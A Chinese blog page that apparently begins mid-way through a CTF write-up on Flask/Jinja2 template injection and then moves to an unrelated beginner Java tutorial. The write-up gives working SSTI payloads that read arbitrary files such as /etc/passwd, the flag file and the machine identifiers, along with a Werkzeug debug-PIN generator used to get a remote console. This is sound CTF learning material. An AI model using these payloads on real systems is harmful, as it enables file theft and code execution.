<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="name">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

结果 ： [&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;]

其中this_is_the_flag.txt有flag字样，那么接下来就是想办法读这个文件，还是采用拼接字符串的方式，然后结合内建函数open

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;</span>,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

除了字符串拼接，还可以通过倒序输出的方式利用,倒序输出绕过

即`txt.galf_eht_si_siht/’[::-1]` 将字符倒转输出

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[<span class="symbol">::-1</span>],&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

预期解

文件包含，PIN码生成

关于PIN码的相关资料请参考：[Flask debug 模式 PIN 码生成机制安全性研究笔记](https://www.cnblogs.com/HacTF/p/8160076.html)

得到PIN码需要六个信息，其中2和3易知

    flask所登录的用户名
    modname，一般是flask.app
    getattr(app, “name”, app.class.name)。一般为Flask
    flask库下app.py的绝对路径。这个可以由报错信息看出
    当前网络的mac地址的十进制数。
    机器的id。
\1. flask用户名可以通过读取/etc/passwd来知道

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/etc/passwd&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

结果：知道用户名为flaskweb

![image-20220528155811783](./buu/image-20220528155811783.png)

\2. app.py的绝对路径，可从报错信息得到

<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3<span class="number">.7</span><span class="regexp">/site-packages/</span>flask/app.py</span><br></pre></td></tr></table></figure>

![image-20220528155907400](./buu/image-20220528155907400.png)

\3. mac地址的十进制数

首先要得到网卡 **/sys/class/net/eth0/address**

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/sys/class/net/eth0/address&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

mac地址

<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">10</span>:<span class="number">93</span>:<span class="number">07</span></span><br><span class="line">将：去掉</span><br><span class="line"><span class="number">0242</span>ac109307</span><br><span class="line">在<span class="keyword">python</span>中进行转化</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">int</span>(<span class="string">&#x27;0242ac109307&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">​得到</span><br><span class="line"><span class="number">2485377864455</span></span><br></pre></td></tr></table></figure>

docker机器的id

    引用大佬的解释：
    
    对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件。
    
    对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，
    
     &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</Flask></path:shrine></code></pre>
<p>得到docker机器id，也就是**1:name=systemd:/docker/**之后的字符串<img src="/2022/05/05/buu/image-20220528160111895.png" alt="image-20220528160111895"></p>
<p>生成PIN码</p>
<p>巨佬的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377864455&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PIN码的结果是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">199-196-476</span><br></pre></td></tr></table></figure>

<p>传入PIN码，终端RCE</p>
<p>然后在报错的界面，点击窗口栏，输入PIN</p>
<p><img src="/2022/05/05/buu/image-20220528160238269.png" alt="image-20220528160238269"></p>
<p><img src="/2022/05/05/buu/image-20220528160250151.png" alt="image-20220528160250151"></p>
<p>终端shell</p>
<p><img src="/2022/05/05/buu/image-20220528160307498.png" alt="image-20220528160307498"></p>
<p>得到flag<img src="/2022/05/05/buu/image-20220528160325563.png" alt="image-20220528160325563"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/13/JAVA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/13/JAVA/" class="post-title-link" itemprop="url">JAVA</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-13 20:20:19" itemprop="dateCreated datePublished" datetime="2022-04-13T20:20:19+08:00">2022-04-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-02 23:47:30" itemprop="dateModified" datetime="2022-05-02T23:47:30+08:00">2022-05-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/JAVA/" itemprop="url" rel="index"><span itemprop="name">JAVA</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>57k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>52 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="第一个Java程序-HelloWorld-java"><a href="#第一个Java程序-HelloWorld-java" class="headerlink" title="第一个Java程序-HelloWorld.java"></a>第一个Java程序-HelloWorld.java</h1><p><img src="/2022/04/13/JAVA/image-20220414145900469.png" alt="image-20220414145900469"></p>
<p>使用记事本写一个HelloWorld.java         java严格区分大小写</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloChina</span></span>&#123;</span><br><span class="line">    <span class="comment">//main方法是程序的入口，格式固定</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out,println(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在文件所在文件夹命令行输入</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">javac </span>HelloWorld.<span class="keyword">java </span>  编译</span><br><span class="line">若有中文则</span><br><span class="line"><span class="keyword">javac </span>-encoding utf<span class="number">-8</span> HelloWorld.<span class="keyword">java </span></span><br><span class="line">否则报错：编码 GBK 的不可映射字符 (<span class="number">0x81</span>)</span><br></pre></td></tr></table></figure>

<p>生成一个字节码文件，字节码文件名是我们写的源文件中的类名HelloChina.class</p>
<p><img src="/2022/04/13/JAVA/image-20220414151352586.png" alt="image-20220414151352586"></p>
<p>再java.exe运行字节码文件    java HelloChina(不用加class后缀)</p>
<p><img src="/2022/04/13/JAVA/image-20220414150918266.png" alt="image-20220414150918266"></p>
<hr>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>单行注释：//</p>
<p>多行注释：/*注释文字 */    不可嵌套使用！</p>
<p>文档注释（java特有）：注释内容可以被JDK提供的工具javadoc所解析，生成一套以网页文件形式体现的该程序的说明文档。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">	<span class="doctag">@author</span> 指定java程序的作者</span></span><br><span class="line"><span class="comment">	<span class="doctag">@version</span> 指定源文件的版本</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">操作方式：</span><br><span class="line">javadoc -encoding UTF-<span class="number">8</span> -d Firstdoc -author -version HelloWorld.java</span><br><span class="line">（javadoc解析的程序要为<span class="keyword">public</span> <span class="class"><span class="keyword">class</span>）</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">例：</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">/**</span></span><br><span class="line"><span class="class"> @<span class="title">author</span> <span class="title">echo</span></span></span><br><span class="line"><span class="class"> @<span class="title">version</span> <span class="title">v1</span>.0</span></span><br><span class="line"><span class="class"> 这是我的第一个<span class="title">java</span>程序！</span></span><br><span class="line"><span class="class"> */</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">	<span class="comment">/**如下的main方法：程序的入口,public class类名要与文件名一致 */</span> </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		<span class="comment">/* ssss*/</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220414212806174.png" alt="image-20220414212806174"></p>
<p><img src="/2022/04/13/JAVA/image-20220414212941524.png" alt="image-20220414212941524"></p>
<hr>
<h2 id="Java-API文档"><a href="#Java-API文档" class="headerlink" title="Java API文档"></a>Java API文档</h2><p>●API (Application Programming Interface,应用程序编程接口)是Java提供的基本编程接口。<br>●Java语言提供了大量的基础类，因此Oracle也为这些基础类提供了相应的API文档，用于告诉开发者如何使用这些类，以及这些类里包含的方法。<br>●下载API:<br><a target="_blank" rel="noopener" href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a><br>➢Additional Resources-Java SE 8 Documentation下载。</p>
<hr>
<h2 id="第一个java程序总结"><a href="#第一个java程序总结" class="headerlink" title="第一个java程序总结"></a>第一个java程序总结</h2><p>1、java程序编写-编译-运行的过程</p>
<p>编写：我们将编写的java代码保存在以“.java”结尾的源文件中</p>
<p>编译：使用javac.exe命令编译我们的.java源文件，格式：javac 源文件名.java</p>
<p>运行：使用java.exe命令解释运行我们的字节码文件，格式：java 类名</p>
<p>2、在一个java源文件中可以声明多个class，但是，只能最多有一个类声明为public的，而且要求声明为public的类的类名必须与源文件名相同。</p>
<p>3、程序的入口：main()方法。格式固定：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>4、输出语句：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(); 先输出后换行，如果没有输出内容，就是只是换行作用</span><br><span class="line">System.out.print(); 输出不换行</span><br></pre></td></tr></table></figure>

<p>5、每个执行语句以”;”结尾</p>
<p>6、编译的过程：编译以后，会生成一个或多个字节码文件。字节码文件的文件名与java源文件中的类名相同。有几个类就有几个字节码文件</p>
<p>运行时运行包含main()方法class文件</p>
<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="关键字和保留字"><a href="#关键字和保留字" class="headerlink" title="关键字和保留字"></a>关键字和保留字</h2><p> 关键字中所有字母都为小写</p>
<p><img src="/2022/04/13/JAVA/image-20220414223744120.png" alt="image-20220414223744120"></p>
<p><img src="/2022/04/13/JAVA/image-20220414223823392.png" alt="image-20220414223823392"></p>
<p>保留字：goto , const</p>
<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>凡是自己可以起名字的地方都叫标识符(变量，方法，类名等)</p>
<p>定义合法标识符规则:<br>➢由26个英文字母大小写，0-9，_ 或$ 组成.<br>➢数字不可以开头。<br>➢不可以使用关键字和保留字，但能包含关键字和保留字。<br>➢Java中严格区分大小写，长度无限制。<br>➢标识符不能包含空格。</p>
<p>标识符命名规范：<br>➢包名:多单词组成时所有字母都小写: xxyyyzzz<br>➢类名、接口名:多单词组成时，所有单词的首字母大写: XxxYyyZzz<br>➢变量名、方法名:多单词组成时，第一个单词首字母小写，第二个单词开始每个单词首字母大写: xxxYyyZzz|<br>➢常量名:所有字母都大写。多单词时每个单词用下划线连接: XXX_ _YYY_ZZZ<br>●注意1:在起名字时，为了提高阅读性，要尽量有意义，“见名知意”。<br>●注意2: java采用unicode字符集，因此标识符也可以使用汉字声明，但是不建议使用。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h2><p>变量<strong>必须先声明初始化后使用</strong>，定义在作用域内，在其作用域才有效</p>
<p>格式：数据类型 变量名 = 变量值;  int myAge = 18;</p>
<p>成员变量:可以不初始化，有默认初始化值</p>
<p>形参变量：无须初始化</p>
<p>局部变量：必须初始化</p>
<p>数据类型分类方式一：</p>
<p><img src="/2022/04/13/JAVA/image-20220415195814586.png" alt="image-20220415195814586"></p>
<p>分类方式二:变量在类中声明的位置：</p>
<p>成员变量  VS  局部变量</p>
<p>①byte:1字节(范围：-128~127)    short：2字节     int：4字节       long：8字节</p>
<p>声明long变量的时候，必须要用L或者l(小写的L)结尾</p>
<p>②float：4字节     double：8字节 </p>
<p>java浮点型常量（带小数点的数值）默认<strong>double</strong>型，声明float型常量，须后加‘f’或‘F’。float表示的数值范围比long还大</p>
<p>③字符型：char（1个字符=2字节）声明定义char型变量通常使用一对单引号，只能用单引号，<strong>单引号里只能写1个字符</strong>。或者转义字符  char c = ‘\n’;<img src="/2022/04/13/JAVA/image-20220415202918155.png" alt="image-20220415202918155"></p>
<p>●字符型变量的三种表现形式:<br>➢字符常量是用单引号(‘’)括起来的单个字符。例如: char c1=’a’; char c2<br>= ‘中’; char c3 = ‘9’;<br>➢Java中还允许使用转义字符’ \ ‘ 来将其后的字符转变为特殊字符型常量。例如: char c3 = ‘\n’;   // ‘\n’表示换行符<br>➢直接使用Unicode值来表示字符型常量: ‘\uXXXX’。 其中，XXXX代表<br>一个十六进制整数。如: \u000a 表示\n。<br>●char类型是可以进行运算的。因为它都对应有Unicode码。</p>
<p>④Boolean   </p>
<p>只能取true,false，常在条件判断，循环中使用</p>
<p>⑤基本数据类型之间的运算规则：</p>
<p>前提：这里讨论的只是7种基本数据类型变量之间的运算，不包含boolean类型</p>
<p>1.自动类型提升：</p>
<p>结论：当容量小的数据类型的变量与容量大的数据类型的变量做运算时，结果自动提升为容量大的数据类型。说明:此时的容量大小指的是，表示数的范围的大和小。比如: float容量要大于long的容量</p>
<p>byte 、char、 short –&gt;int –&gt;long –&gt; float –&gt; double</p>
<p><img src="/2022/04/13/JAVA/image-20220415221234128.png" alt="image-20220415221234128"></p>
<p>特别的：当char,byte,short 三种类型变量做运算后结果都是int类型</p>
<p>2.强制类型转换</p>
<p>自动类型提升运算的逆运算</p>
<p>1.需要使用强转符: ()   如：(int)<br>2.注意点:强制类型转换，可能导致精度损失。</p>
<p>整型常量，默认类型为int型，浮点型常量，默认类型为double型</p>
<p><img src="/2022/04/13/JAVA/image-20220415224243732.png" alt="image-20220415224243732"></p>
<p>⑥String类型变量-class类，引用数据类型，翻译为：字符串</p>
<p>声明时<strong>只能用一对双引号</strong>，与char区别开</p>
<p>String可以和8种基本数据类型变量做运算，且<strong>运算只能是连接运算</strong>: +</p>
<p>运算的结果只能是String类型</p>
<p><img src="/2022/04/13/JAVA/image-20220415225715209.png" alt="image-20220415225715209"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//练习1</span></span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span> ; <span class="comment">//97    A:65 </span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">String str = <span class="string">&quot;hello&quot;</span> ;    <span class="comment">//运算顺序</span></span><br><span class="line">System.out.println(c + num + str);<span class="comment">//107he1lo</span></span><br><span class="line">System.out.print1n(c + str + num);<span class="comment">//ahe11o10</span></span><br><span class="line">System.out.println(c + (num + str));<span class="comment">//a10hello</span></span><br><span class="line">System.out.println((c + num) + str);<span class="comment">//107he1lo</span></span><br><span class="line">System.out.println(str + num + c);<span class="comment">//hel1o10a</span></span><br></pre></td></tr></table></figure>

<p>char+char:做的算数运算，结果为int       char+String:连接，结果为String</p>
<p>计算机底层都以补码的方式来存储数据</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p><img src="/2022/04/13/JAVA/image-20220415233741133.png" alt="image-20220415233741133"></p>
<p>%取余：结果的符号与被模数相同，也就是%前面的</p>
<p>开发中，经常使用%来判断能否被除尽的情况。</p>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>●符号:  =<br>➢当“=”两侧数据类型不一致时，可以使用自动类型转换或使用强制类型转换原则进行处理。<br>➢支持连续赋值。</p>
<p>●扩展赋值运算符:     += ， -=  ,  *=  ,  /=  ,  %=   （不会改变本身变量的数据类型）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">short</span> s<span class="number">1</span> = <span class="number">10</span>;  s<span class="number">1</span>=s<span class="number">1</span>+<span class="number">1</span>; //编译失败，<span class="number">1</span>是int</span><br><span class="line"><span class="attribute">s1</span>++; //编译成功</span><br><span class="line"><span class="attribute">s1</span> += <span class="number">1</span>; //编译成功</span><br></pre></td></tr></table></figure>

<p>开发中，如果希望变量实现+2的操作，有几种方法? (前提: int num=10;)<br>方式一<br>num = num + 2;<br>方式二:<br>num += 2;（推荐）</p>
<p>开发中，如果希望变量实现+1的操作，有几种方法? (前提: int num = 10;)<br>方式一: num= num + 1;<br>方式二: num += 1;<br>方式三: num++; (推荐)</p>
<h3 id="比较运算符（关系运算符）"><a href="#比较运算符（关系运算符）" class="headerlink" title="比较运算符（关系运算符）"></a>比较运算符（关系运算符）</h3><p><img src="/2022/04/13/JAVA/image-20220416143148676.png" alt="image-20220416143148676"></p>
<p>➢比较运算符的结果都是boolean型，也就是要么是true，要么是false。<br>➢比较运算符“==”不能误写成“=”</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p><img src="/2022/04/13/JAVA/image-20220416145259525.png" alt="image-20220416145259525"></p>
<p>区分: &amp;与&amp;&amp;<br>相同点1: &amp;与&amp;&amp; 的运算结果相同<br>相同点2:当符号左边是true时，二者都会执行符号右边的运算<br>不同点:当符号左边是false时，&amp;继续执行符号右边的运算。&amp;&amp;不再执行符号右边的运算。</p>
<p>开发中，推荐使用&amp;&amp;</p>
<p>区分: |与||<br>相同点1:  |与|| 的运算结果相同<br>相同点2: 当符号左边是false时，二者都会执行符号右边的运算<br>不同点 : 当符号左边是true时，| 会继续执行符号右边的运算，而| |不再执行符号右边的运算</p>
<p>开发中，推荐使用 ||</p>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><p><img src="/2022/04/13/JAVA/image-20220416151747553.png" alt="image-20220416151747553"></p>
<p><img src="/2022/04/13/JAVA/image-20220416153943283.png" alt="image-20220416153943283"></p>
<p>位运算是直接对整数的二进制进行的运算</p>
<p>左移一位相当于乘以2，右移一位相当于整除以2</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Bit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num1 = <span class="number">10</span>;</span><br><span class="line">		System.out.println(<span class="string">&quot;num1 &lt;&lt; 2: &quot;</span> + (num1 &lt;&lt; <span class="number">2</span>));   <span class="comment">//加括号</span></span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">num1 &lt;&lt; <span class="number">2</span>: <span class="number">40</span></span><br></pre></td></tr></table></figure>

<p>结论:<br>1.位运算符操作的都是整型的数据</p>
<p>2.<code>&lt;&lt;</code> : 在一定范围内，每向左移1位，相当于 *  2</p>
